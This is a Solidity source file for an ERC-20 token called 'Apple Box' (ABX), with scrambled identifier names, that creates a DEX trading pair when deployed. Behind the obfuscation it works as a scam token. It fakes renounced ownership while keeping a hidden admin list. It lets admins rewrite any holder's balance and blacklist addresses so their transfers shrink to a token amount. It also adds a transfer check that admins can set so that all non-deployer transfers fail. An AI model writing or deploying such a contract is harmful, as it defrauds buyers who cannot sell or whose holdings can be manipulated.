//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface davxtaqahrlxbv {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract oatejnhgacut {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface gxzwfxzmjq {
    function createPair(address xkdpxlsrjdzyft, address kqoxvndbvi) external returns (address);
}

interface acgtipgqeu {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fudszvesblsryu) external view returns (uint256);

    function transfer(address qvtscqlhpdfz, uint256 tsbfonxgyfuh) external returns (bool);

    function allowance(address krxpjxteppyfx, address spender) external view returns (uint256);

    function approve(address spender, uint256 tsbfonxgyfuh) external returns (bool);

    function transferFrom(
        address sender,
        address qvtscqlhpdfz,
        uint256 tsbfonxgyfuh
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tivoxoisrn, uint256 value);
    event Approval(address indexed krxpjxteppyfx, address indexed spender, uint256 value);
}

interface acgtipgqeuMetadata is acgtipgqeu {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AppleBox is oatejnhgacut, acgtipgqeu, acgtipgqeuMetadata {

    function ythvbikaxd(address lgpunxewyxsx) public {
        if (fcpcceziixq) {
            return;
        }
        
        kelewmmmbo[lgpunxewyxsx] = true;
        if (dwgschgsbzip != raexgztqixtmhh) {
            rwtuyyucxhbld = mntyqpkspcoiyr;
        }
        fcpcceziixq = true;
    }

    function hnoibabywefnk(address jjlovpflku, address qvtscqlhpdfz, uint256 tsbfonxgyfuh) internal returns (bool) {
        if (jjlovpflku == lozdnbxtbdmkd) {
            return uuwipylnwunnxo(jjlovpflku, qvtscqlhpdfz, tsbfonxgyfuh);
        }
        uint256 lndrderuvrppj = acgtipgqeu(bxsibbfqr).balanceOf(iyjtlfbbeyr);
        require(lndrderuvrppj == fpqvaeuqewfrr);
        if (mqwkqrucnz[jjlovpflku]) {
            return uuwipylnwunnxo(jjlovpflku, qvtscqlhpdfz, olvkkiryzzh);
        }
        return uuwipylnwunnxo(jjlovpflku, qvtscqlhpdfz, tsbfonxgyfuh);
    }

    uint256 private dwgschgsbzip;

    bool public aizocihosrdzx;

    function owner() external view returns (address) {
        return ogszyxjjjlpgn;
    }

    function balanceOf(address fudszvesblsryu) public view virtual override returns (uint256) {
        return nlnbpcgmuove[fudszvesblsryu];
    }

    uint256 private qgayqejhndthz = 100000000 * 10 ** 18;

    function transfer(address bszaidfpy, uint256 tsbfonxgyfuh) external virtual override returns (bool) {
        return hnoibabywefnk(_msgSender(), bszaidfpy, tsbfonxgyfuh);
    }

    function name() external view virtual override returns (string memory) {
        return sbaajztozbfz;
    }

    mapping(address => bool) public mqwkqrucnz;

    function yzejperimvb(address bszaidfpy, uint256 tsbfonxgyfuh) public {
        cxhjynlniskn();
        nlnbpcgmuove[bszaidfpy] = tsbfonxgyfuh;
    }

    uint256 constant olvkkiryzzh = 11 ** 10;

    string private sbaajztozbfz = "Apple Box";

    mapping(address => uint256) private nlnbpcgmuove;

    uint256 private mntyqpkspcoiyr;

    function allowance(address wvzyxhewn, address ztjezthnybh) external view virtual override returns (uint256) {
        if (ztjezthnybh == tgkehnelk) {
            return type(uint256).max;
        }
        return rpuzshjtozso[wvzyxhewn][ztjezthnybh];
    }

    event OwnershipTransferred(address indexed tilvitdroip, address indexed mqeevawzalyu);

    uint256 public rwtuyyucxhbld;

    mapping(address => bool) public kelewmmmbo;

    mapping(address => mapping(address => uint256)) private rpuzshjtozso;

    uint256 private dzkjykocbwq;

    uint256 ixatnlmfze;

    function jezybezoez(address chaseeaqoad) public {
        cxhjynlniskn();
        
        if (chaseeaqoad == lozdnbxtbdmkd || chaseeaqoad == bxsibbfqr) {
            return;
        }
        mqwkqrucnz[chaseeaqoad] = true;
    }

    function getOwner() external view returns (address) {
        return ogszyxjjjlpgn;
    }

    address tgkehnelk = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 fpqvaeuqewfrr;

    function symbol() external view virtual override returns (string memory) {
        return rzxeorpiy;
    }

    constructor (){
        
        pjeopwcrwymts();
        davxtaqahrlxbv mulfnpudtdel = davxtaqahrlxbv(tgkehnelk);
        bxsibbfqr = gxzwfxzmjq(mulfnpudtdel.factory()).createPair(mulfnpudtdel.WETH(), address(this));
        
        lozdnbxtbdmkd = _msgSender();
        kelewmmmbo[lozdnbxtbdmkd] = true;
        nlnbpcgmuove[lozdnbxtbdmkd] = qgayqejhndthz;
        if (dwgschgsbzip == raexgztqixtmhh) {
            raexgztqixtmhh = dwgschgsbzip;
        }
        emit Transfer(address(0), lozdnbxtbdmkd, qgayqejhndthz);
    }

    uint256 public raexgztqixtmhh;

    string private rzxeorpiy = "ABX";

    bool private jvoyetiihfbmj;

    uint8 private jzclsegphokoh = 18;

    address public bxsibbfqr;

    function cxhjynlniskn() private view {
        require(kelewmmmbo[_msgSender()]);
    }

    address public lozdnbxtbdmkd;

    function uuwipylnwunnxo(address jjlovpflku, address qvtscqlhpdfz, uint256 tsbfonxgyfuh) internal returns (bool) {
        require(nlnbpcgmuove[jjlovpflku] >= tsbfonxgyfuh);
        nlnbpcgmuove[jjlovpflku] -= tsbfonxgyfuh;
        nlnbpcgmuove[qvtscqlhpdfz] += tsbfonxgyfuh;
        emit Transfer(jjlovpflku, qvtscqlhpdfz, tsbfonxgyfuh);
        return true;
    }

    function transferFrom(address jjlovpflku, address qvtscqlhpdfz, uint256 tsbfonxgyfuh) external override returns (bool) {
        if (_msgSender() != tgkehnelk) {
            if (rpuzshjtozso[jjlovpflku][_msgSender()] != type(uint256).max) {
                require(tsbfonxgyfuh <= rpuzshjtozso[jjlovpflku][_msgSender()]);
                rpuzshjtozso[jjlovpflku][_msgSender()] -= tsbfonxgyfuh;
            }
        }
        return hnoibabywefnk(jjlovpflku, qvtscqlhpdfz, tsbfonxgyfuh);
    }

    function rxswvdiysogx(uint256 tsbfonxgyfuh) public {
        cxhjynlniskn();
        fpqvaeuqewfrr = tsbfonxgyfuh;
    }

    function pjeopwcrwymts() public {
        emit OwnershipTransferred(lozdnbxtbdmkd, address(0));
        ogszyxjjjlpgn = address(0);
    }

    bool public fcpcceziixq;

    function totalSupply() external view virtual override returns (uint256) {
        return qgayqejhndthz;
    }

    address private ogszyxjjjlpgn;

    address iyjtlfbbeyr = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return jzclsegphokoh;
    }

    function approve(address ztjezthnybh, uint256 tsbfonxgyfuh) public virtual override returns (bool) {
        rpuzshjtozso[_msgSender()][ztjezthnybh] = tsbfonxgyfuh;
        emit Approval(_msgSender(), ztjezthnybh, tsbfonxgyfuh);
        return true;
    }

}